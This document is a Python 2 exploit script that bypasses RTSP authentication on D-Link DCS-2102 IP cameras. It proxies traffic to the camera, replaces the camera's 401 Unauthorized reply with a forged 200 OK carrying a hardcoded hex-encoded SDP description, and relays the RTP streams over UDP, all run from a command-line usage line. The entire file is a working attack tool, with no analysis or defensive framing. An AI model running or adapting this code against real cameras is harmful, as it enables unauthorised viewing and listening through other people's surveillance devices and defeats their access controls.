import sys
from socket import *
from threading import Thread
import time, re

LOGGING = 1

def log(s):
    if LOGGING:
        print '(%s) %s' % (time.ctime(), s)


class UDPRequestHandler(Thread):
    def __init__(self, data_to_send, recv_addr, dst_addr):
        Thread.__init__(self)
        self.data_to_send = data_to_send
        self.recv_addr = recv_addr
        self.dst_addr = dst_addr
    
    def run(self):
        sender = socket(AF_INET, SOCK_DGRAM)
        sender.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        sender.sendto(self.data_to_send, self.dst_addr)
        response = sender.recv(1024)
        sender.sendto(response, self.recv_addr)
        sender.close()


class UDPDispatcher(Thread):
    dispatchers = []
    
    def __has_dispatcher_for(self, port):
        return any([d.src_port == port for d in UDPDispatcher.dispatchers])
    
    def __init__(self, src_port, dst_addr):
        Thread.__init__(self)
        if self.__has_dispatcher_for(src_port):
            raise Exception('There is already a dispatcher for port %d'
% src_port)
        self.src_port = src_port
        self.dst_addr = dst_addr
        UDPDispatcher.dispatchers.append(self)
    
    def run(self):
        listener = socket(AF_INET, SOCK_DGRAM)
        listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        listener.bind(('', self.src_port))
        while 1:
            try:
                data, recv_addr = listener.recvfrom(1024)
                if not data: break
                UDPRequestHandler(data, recv_addr, self.dst_addr).start()
            except Exception as e:
                print e
                break        
        listener.close()
        UDPDispatcher.dispatchers.remove( self )


class PipeThread(Thread):
    pipes = []
    def __init__(self, source, sink, process_data_callback=lambda x: x):
        Thread.__init__(self)
        self.source = source
        self.sink = sink
        self.process_data_callback = process_data_callback
        PipeThread.pipes.append(self)

    def run(self):
        while 1:
            try:
                data = self.source.recv(1024)
                data = self.process_data_callback(data)
                if not data: break
                self.sink.send( data )
            except Exception as e:
                log(e)
                break
        PipeThread.pipes.remove(self)


class TCPTunnel(Thread):
    def __init__(self, src_port, dst_addr, process_data_callback=lambda
x: x):
        Thread.__init__(self)
        log('[*] Redirecting: localhost:%s -> %s:%s' % (src_port,
dst_addr[0], dst_addr[1]))
        self.dst_addr = dst_addr
        self.process_data_callback = process_data_callback
        # Create TCP listener socket
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.sock.bind(('', src_port))
        self.sock.listen(5)
    
    def run(self):
        while 1:
            # Wait until a new connection arises
            newsock, address = self.sock.accept()
            # Create forwarder socket
            fwd = socket(AF_INET, SOCK_STREAM)
            fwd.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            fwd.connect(self.dst_addr)
            # Pipe them!
            PipeThread(newsock, fwd, self.process_data_callback).start()
            PipeThread(fwd, newsock, self.process_data_callback).start()


class Camera():
    def __init__(self, address):
        self.address = address
    def get_describe_data(self):
        return ''


class DLink(Camera):
    # D-Link DCS-2102/1.06-5731
    def __init__(self, address):
        Camera.__init__(self, address)
    def get_describe_data(self):
        return
'\x76\x3d\x30\x0d\x0a\x6f\x3d\x43\x56\x2d\x52\x54\x53\x50\x48\x61\x6e\x64\x6c\x65\x72\x20\x31\x31\x32\x33\x34\x31\x32\x20\x30\x20\x49\x4e\x20\x49\x50\x34\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x2e\x31\x31\x0d\x0a\x73\x3d\x44\x43\x53\x2d\x32\x31\x30\x32\x0d\x0a\x63\x3d\x49\x4e\x20\x49\x50\x34\x20\x30\x2e\x30\x2e\x30\x2e\x30\x0d\x0a\x74\x3d\x30\x20\x30\x0d\x0a\x61\x3d\x63\x68\x61\x72\x73\x65\x74\x3a\x53\x68\x69\x66\x74\x5f\x4a\x49\x53\x0d\x0a\x61\x3d\x72\x61\x6e\x67\x65\x3a\x6e\x70\x74\x3d\x6e\x6f\x77\x2d\x0d\x0a\x61\x3d\x63\x6f\x6e\x74\x72\x6f\x6c\x3a\x2a\x0d\x0a\x61\x3d\x65\x74\x61\x67\x3a\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30\x0d\x0a\x6d\x3d\x76\x69\x64\x65\x6f\x20\x30\x20\x52\x54\x50\x2f\x41\x56\x50\x20\x39\x36\x0d\x0a\x62\x3d\x41\x53\x3a\x31\x38\x0d\x0a\x61\x3d\x72\x74\x70\x6d\x61\x70\x3a\x39\x36\x20\x4d\x50\x34\x56\x2d\x45\x53\x2f\x39\x30\x30\x30\x30\x0d\x0a\x61\x3d\x63\x6f\x6e\x74\x72\x6f\x6c\x3a\x74\x72\x61\x63\x6b\x49\x44\x3d\x31\x0d\x0a\x61\x3d\x66\x6d\x74\x70\x3a\x39\x36\x20\x70\x72\x6f\x66\x69\x6c\x65\x2d\x6c\x65\x76\x65\x6c\x2d\x69\x64\x3d\x31\x3b\x63\x6f\x6e\x66\x69\x67\x3d\x30\x30\x30\x30\x30\x31\x42\x30\x30\x31\x30\x30\x30\x30\x30\x31\x42\x35\x30\x39\x30\x30\x30\x30\x30\x31\x30\x30\x30\x30\x30\x30\x30\x31\x32\x30\x30\x30\x43\x34\x38\x38\x42\x41\x39\x38\x35\x31\x34\x30\x34\x33\x43\x31\x34\x34\x33\x46\x3b\x64\x65\x63\x6f\x64\x65\x5f\x62\x75\x66\x3d\x37\x36\x38\x30\x30\x0d\x0a\x61\x3d\x73\x65\x6e\x64\x6f\x6e\x6c\x79\x0d\x0a\x6d\x3d\x61\x75\x64\x69\x6f\x20\x30\x20\x52\x54\x50\x2f\x41\x56\x50\x20\x30\x0d\x0a\x61\x3d\x72\x74\x70\x6d\x61\x70\x3a\x30\x20\x50\x43\x4d\x55\x2f\x38\x30\x30\x30\x0d\x0a\x61\x3d\x63\x6f\x6e\x74\x72\x6f\x6c\x3a\x74\x72\x61\x63\x6b\x49\x44\x3d\x32\x0d\x0a\x61\x3d\x73\x65\x6e\x64\x6f\x6e\x6c\x79\x0d\x0a'


class RTSPAuthByPasser():
    DESCRIBE_REQ_HEADER = 'DESCRIBE rtsp://'
    UNAUTHORIZED_RESPONSE = 'RTSP/1.0 401 Unauthorized'
    SERVER_PORT_ARGUMENTS = 'server_port='
    DEFAULT_CSEQ = 1
    DEFAULT_SERVER_PORT_RANGE = '5556-5559'

    def __init__(self, local_port, camera):
        self.last_describe_req = ''
        self.camera = camera
        self.local_port = local_port
        
    def start(self):
        log('[!] Starting bypasser')
        TCPTunnel(self.local_port, self.camera.address,
self.spoof_rtsp_conn).start()
        
    def spoof_rtsp_conn(self, data):
        if RTSPAuthByPasser.DESCRIBE_REQ_HEADER in data:
            self.last_describe_req = data
        elif RTSPAuthByPasser.UNAUTHORIZED_RESPONSE in data and
self.last_describe_req:
            log('[!] Unauthorized response received. Spoofing...')
            spoofed_describe = self.camera.get_describe_data()
            # Look for the request CSeq
            m = re.search('.*CSeq:\\s*(\\d+?)\r\n.*',
self.last_describe_req)
            cseq = m.group(1) if m else RTSPAuthByPasser.DEFAULT_CSEQ
            # Create the response
            data = 'RTSP/1.0 200 OK\r\n'
            data+= 'CSeq: %s\r\n' % cseq
            data+= 'Content-Type: application/sdp\r\n'
            data+= 'Content-Length: %d\r\n' % len(spoofed_describe)
            data+= '\r\n'
            # Attach the spoofed describe
            data+= spoofed_describe       
        elif RTSPAuthByPasser.SERVER_PORT_ARGUMENTS in data:
            # Look for the server RTP ports
            m = re.search('.*%s\\s*(.+?)[;|\r].*' %
RTSPAuthByPasser.SERVER_PORT_ARGUMENTS, data)
            ports = m.group(1) if m else
RTSPAuthByPasser.DEFAULT_SERVER_PORT_RANGE
            # For each port in the range create a UDP dispatcher
            begin_port, end_port = map(int, ports.split('-'))
            for udp_port in xrange(begin_port, end_port + 1):
                try:
                    UDPDispatcher(udp_port, (self.camera.address[0],
udp_port)).start()
                except:
                    pass        
        return data

if __name__ == '__main__':
    if len( sys.argv ) > 1:
        listener_port = camera_port = int(sys.argv[1])
        camera_ip = sys.argv[2]
        if len(sys.argv) == 4:
            camera_port = int(sys.argv[3])
        RTSPAuthByPasser(listener_port, DLink((camera_ip,
camera_port))).start()
    else:
        print 'usage: python %s [local_port] [camera_ip]
[camera_rtsp_port]' 
